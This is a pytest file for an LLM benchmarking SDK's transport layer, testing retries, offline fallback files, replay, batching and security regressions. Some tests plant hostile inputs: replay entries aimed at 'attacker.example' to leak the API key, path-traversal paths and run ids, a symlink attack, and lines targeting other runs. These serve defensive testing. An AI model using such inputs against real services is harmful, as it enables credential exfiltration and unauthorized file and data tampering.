import json

import httpx
import respx

from llmbenchmark.schemas import Record, RunCreate


@respx.mock
def test_sends_bearer_token(mock_transport):
    route = respx.post("http://testserver/v1/runs").respond(201)
    assert mock_transport.create_run(RunCreate(project="p")) is True
    assert route.calls.last.request.headers["Authorization"] == "Bearer test-key"


@respx.mock
def test_retries_then_succeeds(mock_transport):
    route = respx.post("http://testserver/v1/runs").mock(
        side_effect=[httpx.Response(503), httpx.ConnectError("boom"), httpx.Response(201)]
    )
    assert mock_transport.create_run(RunCreate(project="p")) is True
    assert route.call_count == 3


@respx.mock
def test_gives_up_and_writes_fallback(mock_transport, config):
    respx.post(url__regex=r".*/records").mock(side_effect=httpx.ConnectError("down"))
    run_id = "run-1"
    ok = mock_transport.send_records(run_id, [Record(run_id=run_id, input="hi")])

    assert ok is False
    lines = (config.fallback_dir / f"{run_id}.jsonl").read_text().splitlines()
    saved = json.loads(lines[0])
    assert saved["path"] == "/v1/runs/run-1/records"
    assert saved["body"]["records"][0]["input"] == "hi"


@respx.mock
def test_client_errors_are_not_retried(mock_transport):
    route = respx.post("http://testserver/v1/runs").respond(422)
    assert mock_transport.create_run(RunCreate(project="p")) is False
    assert route.call_count == 1


@respx.mock
def test_replay_resends_and_deletes_file(mock_transport, config):
    respx.post("http://testserver/v1/runs").mock(side_effect=httpx.ConnectError("down"))
    run = RunCreate(project="p")
    mock_transport.create_run(run)
    fallback = config.fallback_dir / f"{run.id}.jsonl"
    assert fallback.exists()

    respx.post("http://testserver/v1/runs").respond(201)
    assert mock_transport.replay(fallback) == (1, 0)
    assert not fallback.exists()


def test_disabled_sends_nothing(mock_transport):
    mock_transport.config.enabled = False
    # No respx mock active: a real request would fail. Disabled = silent no-op.
    assert mock_transport.create_run(RunCreate(project="p")) is True


# ---- regressions (AGENTS.md §14) -------------------------------------------

import os  # noqa: E402
import stat  # noqa: E402

import pytest  # noqa: E402

from llmbenchmark import transport as transport_module  # noqa: E402


def _write_lines(path, items):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join((i if isinstance(i, str) else json.dumps(i)) + "\n" for i in items))


@respx.mock
def test_replay_refuses_requests_to_other_hosts(mock_transport, config):
    """S1: a tampered fallback file must not send the API key elsewhere."""
    evil = respx.post("http://attacker.example/x").respond(200)
    any_get = respx.get(url__regex=r".*").respond(200)
    f = config.fallback_dir / "evil.jsonl"
    _write_lines(f, [
        {"method": "POST", "path": "http://attacker.example/x", "body": {}},
        {"method": "POST", "path": "//attacker.example/x", "body": {}},
        {"method": "GET", "path": "/v1/runs", "body": {}},
        {"method": "POST", "path": "/v1/runs/../../admin", "body": {}},
    ])

    assert mock_transport.replay(f) == (0, 4)
    assert not evil.called and not any_get.called
    assert len((config.fallback_dir / "evil.jsonl.rejected").read_text().splitlines()) == 4
    assert not f.exists()


@respx.mock
def test_replay_survives_malformed_lines(mock_transport, config):
    """C7: one bad line doesn't abort the replay."""
    respx.post("http://testserver/v1/runs").respond(201)
    run = RunCreate(project="p")
    f = config.fallback_dir / f"{run.id}.jsonl"  # fallback files are named after their run
    _write_lines(f, ["{not json", {"method": "POST", "path": "/v1/runs", "body": run.model_dump(mode="json")}])

    assert mock_transport.replay(f) == (1, 1)
    assert (config.fallback_dir / f"{run.id}.jsonl.rejected").read_text() == "{not json\n"


@respx.mock
def test_replay_keeps_retryable_and_rejects_permanent_failures(mock_transport, config):
    run = RunCreate(project="p")
    base = f"http://testserver/v1/runs/{run.id}"
    respx.post("http://testserver/v1/runs").respond(201)        # ok
    respx.patch(base).respond(422)                               # rejected for good
    respx.post(f"{base}/records").respond(503)                   # can heal: kept
    respx.post(f"{base}/spans").respond(201)                     # after the 503: kept, unsent
    f = config.fallback_dir / f"{run.id}.jsonl"
    _write_lines(f, [
        {"method": "POST", "path": "/v1/runs", "body": run.model_dump(mode="json")},
        {"method": "PATCH", "path": f"/v1/runs/{run.id}", "body": {"status": "bogus"}},
        {"method": "POST", "path": f"/v1/runs/{run.id}/records", "body": {"records": []}},
        {"method": "POST", "path": f"/v1/runs/{run.id}/spans", "body": {"spans": []}},
    ])

    # Replay stops at the 503, so the line after it is kept too (strict order).
    assert mock_transport.replay(f) == (1, 3)
    kept = f.read_text()
    assert "/records" in kept and "/spans" in kept and '"/v1/runs"' not in kept
    assert "bogus" in (config.fallback_dir / f"{run.id}.jsonl.rejected").read_text()


@respx.mock
def test_replay_does_not_lose_lines_appended_meanwhile(mock_transport, config):
    """C7: a still-running run appending to the file during replay keeps its line."""
    run = RunCreate(project="p")
    f = config.fallback_dir / f"{run.id}.jsonl"
    late = json.dumps({"method": "POST", "path": "/v1/runs", "body": {"late": True}})
    def respond(request):
        with f.open("a") as fh:  # what the SDK's fallback writer would do
            fh.write(late + "\n")
        return httpx.Response(201)
    respx.post("http://testserver/v1/runs").mock(side_effect=respond)
    _write_lines(f, [{"method": "POST", "path": "/v1/runs", "body": run.model_dump(mode="json")}])

    assert mock_transport.replay(f) == (1, 0)
    assert f.read_text() == late + "\n"


def test_replay_when_disabled_sends_nothing(mock_transport, config):
    f = config.fallback_dir / "d.jsonl"
    _write_lines(f, [{"method": "POST", "path": "/v1/runs", "body": {}}])
    mock_transport.config.enabled = False
    assert mock_transport.replay(f) == (0, 1)
    assert f.exists()


@respx.mock
def test_fallback_file_stays_inside_dir_and_is_private(mock_transport, config):
    """S6 + S9: hostile run ids can't escape fallback_dir; files are 0600."""
    respx.post(url__regex=r".*").mock(side_effect=httpx.ConnectError("down"))
    mock_transport.send_records("../../escaped", [Record(run_id="r", input="x")])

    assert not (config.fallback_dir.parent.parent / "escaped.jsonl").exists()
    [written] = list(config.fallback_dir.iterdir())
    assert written.parent == config.fallback_dir
    assert stat.S_IMODE(os.stat(written).st_mode) == 0o600
    # The id was also URL-quoted, so it couldn't change the request path.
    assert json.loads(written.read_text())["path"] == "/v1/runs/..%2F..%2Fescaped/records"


def test_closed_client_falls_back_instead_of_raising(mock_transport, config):
    """C1: any error while sending (here: a closed client) goes to the fallback."""
    mock_transport.close()
    assert mock_transport.create_run(RunCreate(project="p", id="r1")) is False
    assert (config.fallback_dir / "r1.jsonl").exists()


@respx.mock
def test_unserializable_values_are_stringified(mock_transport):
    """C3: a value pydantic can't serialize doesn't drop the batch."""
    route = respx.post(url__regex=r".*/records").respond(201)
    record = Record(run_id="r", input="q", metadata={"obj": object()})
    assert mock_transport.send_records("r", [record]) is True
    sent = json.loads(route.calls.last.request.content)
    assert sent["records"][0]["metadata"]["obj"].startswith("<object object")


@respx.mock
def test_large_batches_are_split(mock_transport, monkeypatch):
    """S5: never send more records than the server accepts per request."""
    monkeypatch.setattr(transport_module, "MAX_BATCH_RECORDS", 2)
    route = respx.post(url__regex=r".*/records").respond(201)
    assert mock_transport.send_records("r", [Record(run_id="r", input=str(i)) for i in range(5)])
    assert [len(json.loads(c.request.content)["records"]) for c in route.calls] == [2, 2, 1]


@respx.mock
def test_every_chunk_is_attempted_after_a_failure(mock_transport, config, monkeypatch):
    """C2: a failed chunk must not stop later chunks from being sent or saved."""
    from llmbenchmark.schemas import Score

    monkeypatch.setattr(transport_module, "MAX_BATCH_RECORDS", 2)
    route = respx.post(url__regex=r".*/scores").mock(side_effect=httpx.ConnectError("down"))
    scores = [Score(evaluation_id="e", record_id="r", metric="m") for _ in range(5)]
    assert mock_transport.send_scores("run-1", "e", scores) is False
    assert route.call_count == 3 * (config.max_retries + 1)
    saved = (config.fallback_dir / "run-1.jsonl").read_text().splitlines()
    assert [len(json.loads(line)["body"]["scores"]) for line in saved] == [2, 2, 1]


def test_get_records_pages_through_results(live_transport, server_client):
    """S5: reads are paginated; get_records follows the pages."""
    run = RunCreate(project="p")
    live_transport.create_run(run)
    live_transport.send_records(run.id, [Record(run_id=run.id, input=str(i)) for i in range(5)])
    records = live_transport.get_records(run.id, page_size=2)
    assert sorted(r.input for r in records) == ["0", "1", "2", "3", "4"]


def test_offline_session_replays_completely(config, server_client, tmp_path):
    """Every request the SDK can write while offline is on the replay allow-list
    and replays in order: prompt, dataset, run, records, trace spans,
    evaluation, scores, metrics, finalize, finish."""
    import llmbenchmark
    from llmbenchmark.run import Run
    from llmbenchmark.transport import Transport

    offline = Transport(config, client=httpx.Client(base_url="http://127.0.0.1:9"), sleep=lambda s: None)
    offline.config.max_retries = 0
    prompt = llmbenchmark.Prompt("qa", system="Be brief.", template="Q: {input}", version="v1")
    dataset = llmbenchmark.Dataset("qa", [{"id": "q1", "input": "2+2?", "expected_output": "4"}], version="1")
    with Run(offline, config, model="m", generation_params={"t": 0}, prompt=prompt, dataset=dataset).start() as run:
        rec = run.log(item=dataset[0], output="4")
        with run.trace(input="find docs") as tr:
            with llmbenchmark.span("search", kind="tool", input={"q": "docs"}) as s:
                s.output = ["doc1"]
            tr.output = "found"
        with run.evaluation("team-x", metrics={"acc": {"threshold": 1}}) as ev:
            ev.score(rec, "acc", 1.0)
            ev.metric("acc", 1.0, n=1)

    fallback = config.fallback_dir / f"{run.id}.jsonl"
    written = len(fallback.read_text().splitlines())
    # prompt, dataset, dataset items, run, records (1 batch), spans, evaluation,
    # scores, metrics, finalize, finish
    assert written == 11
    online = Transport(config, client=server_client, sleep=lambda s: None)
    sent, failed = online.replay(fallback)
    assert (sent, failed) == (written, 0)

    auth = {"Authorization": "Bearer test-key"}
    stored = server_client.get(f"/v1/runs/{run.id}", headers=auth).json()
    assert stored["status"] == "completed"
    assert len(server_client.get(f"/v1/runs/{run.id}/records", headers=auth).json()) == 2
    assert len(server_client.get(f"/v1/runs/{run.id}/spans", headers=auth).json()) == 2
    [ev_info] = server_client.get(f"/v1/runs/{run.id}/evaluations", headers=auth).json()
    assert ev_info["status"] == "finalized"
    assert server_client.get(f"/v1/prompts/{prompt.hash}", headers=auth).status_code == 200
    assert len(server_client.get(f"/v1/datasets/{dataset.hash}/items", headers=auth).json()) == 1


def test_replay_stops_at_the_first_temporary_failure(config, server_client):
    """#3: replay used to keep going after a transient failure, so spans and scores
    sent after their (failed) record were rejected for good."""
    import llmbenchmark
    from llmbenchmark.run import Run
    from llmbenchmark.transport import Transport

    offline = Transport(config, client=httpx.Client(base_url="http://127.0.0.1:9"), sleep=lambda s: None)
    offline.config.max_retries = 0
    with Run(offline, config, mode="external").start() as run:
        with run.trace(input="t") as tr:
            with llmbenchmark.span("tool", kind="tool"):
                pass
            tr.output = "o"
    fallback = config.fallback_dir / f"{run.id}.jsonl"
    written = len(fallback.read_text().splitlines())  # run, records, spans, finish

    blips = {"left": 1}

    def flaky(request):  # the first /records request hits a network blip
        if request.url.path.endswith("/records") and blips["left"]:
            blips["left"] -= 1
            raise httpx.ConnectError("blip")
        target = request.url.path + (f"?{request.url.query.decode()}" if request.url.query else "")
        r = server_client.request(request.method, target, content=request.content, headers=dict(request.headers))
        return httpx.Response(r.status_code, content=r.content, headers=dict(r.headers))

    online = Transport(config, client=httpx.Client(base_url="http://testserver", transport=httpx.MockTransport(flaky)),
                       sleep=lambda s: None)
    assert online.replay(fallback) == (1, written - 1)  # run created; the rest kept, in order
    assert online.replay(fallback) == (written - 1, 0)
    assert not (config.fallback_dir / f"{run.id}.jsonl.rejected").exists()
    assert len(server_client.get(f"/v1/runs/{run.id}/spans", headers={"Authorization": "Bearer test-key"}).json()) == 2


def test_replay_after_an_interrupted_replay(mock_transport, config):
    """#11: only the .replaying file remains (the original was consumed)."""
    respx_router = respx.mock(assert_all_called=False)
    with respx_router:
        respx_router.post("http://testserver/v1/runs").respond(201)
        run = RunCreate(project="p")
        f = config.fallback_dir / f"{run.id}.jsonl"
        _write_lines(f.with_name(f"{run.id}.jsonl.replaying"),
                     [{"method": "POST", "path": "/v1/runs", "body": run.model_dump(mode="json")}])
        assert mock_transport.replay(f) == (1, 0)


@pytest.mark.parametrize("link", ["x.jsonl", "x.jsonl.replaying", "x.jsonl.rejected"])
def test_replay_refuses_symlinks(mock_transport, config, tmp_path, link):
    """S-M3: a planted symlink made replay append to (or read) arbitrary files."""
    victim = tmp_path / "victim.txt"
    victim.write_text("# victim\n")
    config.fallback_dir.mkdir(parents=True, exist_ok=True)
    f = config.fallback_dir / "x.jsonl"
    if link != "x.jsonl":
        f.write_text("echo pwned\n")
    os.symlink(victim, config.fallback_dir / link)
    with pytest.raises(ValueError, match="symlink"):
        mock_transport.replay(f)
    assert victim.read_text() == "# victim\n"


def test_fallback_dir_is_made_private_even_if_it_existed(mock_transport, config):
    """S-M3: mkdir(mode=0o700) does nothing for an existing (e.g. world-readable) dir."""
    config.fallback_dir.mkdir(parents=True)
    os.chmod(config.fallback_dir, 0o755)
    mock_transport.close()
    mock_transport.create_run(RunCreate(project="p"))  # closed client -> falls back
    assert stat.S_IMODE(os.stat(config.fallback_dir).st_mode) == 0o700


@respx.mock
def test_invalid_lines_are_not_echoed_to_logs(mock_transport, config, caplog):
    f = config.fallback_dir / "x.jsonl"
    _write_lines(f, ["secret prompt text, not json"])
    with caplog.at_level("WARNING", logger="llmbenchmark"):
        mock_transport.replay(f)
    assert "secret prompt" not in caplog.text and "invalid line 1" in caplog.text


def test_replay_lines_must_belong_to_the_files_run(config, server_client):
    """S-L1: a planted line could act (with your key) on any run or evaluation."""
    from llmbenchmark.run import Run
    from llmbenchmark.transport import Transport

    online = Transport(config, client=server_client, sleep=lambda s: None)
    victim = Run(online, config, mode="external").start()
    victim_eval = victim.evaluation("x")  # open evaluation of another run
    mine = RunCreate(project="p")
    f = config.fallback_dir / f"{mine.id}.jsonl"
    _write_lines(f, [
        {"method": "POST", "path": "/v1/runs", "body": mine.model_dump(mode="json")},          # ok
        {"method": "PATCH", "path": f"/v1/runs/{victim.id}", "body": {"status": "failed"}},   # other run
        {"method": "POST", "path": f"/v1/evaluations/{victim_eval.id}/finalize", "body": {}},  # other run's eval
    ])
    assert online.replay(f) == (1, 2)
    auth = {"Authorization": "Bearer test-key"}
    assert server_client.get(f"/v1/runs/{victim.id}", headers=auth).json()["status"] == "running"
    assert server_client.get(f"/v1/evaluations/{victim_eval.id}", headers=auth).json()["status"] == "open"


def test_warns_when_the_key_would_travel_over_plain_http(caplog):
    from llmbenchmark.config import load_config
    from llmbenchmark.transport import Transport

    with caplog.at_level("WARNING", logger="llmbenchmark"):
        Transport(load_config(endpoint="http://bench.internal:8000", api_key="k", capture_git=False)).close()
        Transport(load_config(endpoint="http://localhost:8000", api_key="k", capture_git=False)).close()
        Transport(load_config(endpoint="https://bench.internal", api_key="k", capture_git=False)).close()
    assert caplog.text.count("plain http") == 1


def test_replay_of_a_missing_file_is_a_no_op(mock_transport, config):
    assert mock_transport.replay(config.fallback_dir / "never-written.jsonl") == (0, 0)
